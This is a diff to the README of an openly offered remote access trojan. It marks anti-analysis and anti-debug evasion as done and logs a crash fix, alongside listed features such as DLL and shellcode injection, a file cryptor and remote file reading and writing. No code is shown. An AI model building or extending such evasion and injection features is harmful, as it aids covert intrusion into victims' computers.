@@ -90,7 +90,7 @@
 - [x] Add process control (inject dll, shellcode and etc.)
 - [x] Add more information about PC 
 - [x] Add Service manager (for deleting, showing and adding your system drivers)
-- [ ] Add Anti-analysis + Anti-debug functions
+- [x] Add Anti-analysis + Anti-debug functions
 
 # [CHANGELOG]
 <details>
@@ -110,7 +110,7 @@ Date       | Time  | Description
 07.11.2020 | 22:16 | Code refactored. Warnings deleted. Added encryption for your botapi with AES256 (To avoid being stolen from hex). Update list of processes (AntiDebug). ![BeforeBotApi](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/Before_BotApi.png) ![AfterBotApi](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/After_BotApi.png)
 08.11.2020 | 20:25 | Added file cryptor. See command list ![1](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/1.png) ![2](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/2.png) ![3](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/3.png) ![4](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/4.png)
 19.11.2020 | 20:20 | Code refactored. Fixed command "dir del_file". Added commands in File Manager: "dir read" and "dir write" to read and write files (see command list) ![dir_read](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/dir/dir_read.png) ![dir_write](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/dir/dir_write.png)
-
+12.02.2021 | 23:30 | Fix crash in Anti-Analysis & Anti-Debug function
 </details>
 
 ## Service manager parse table:
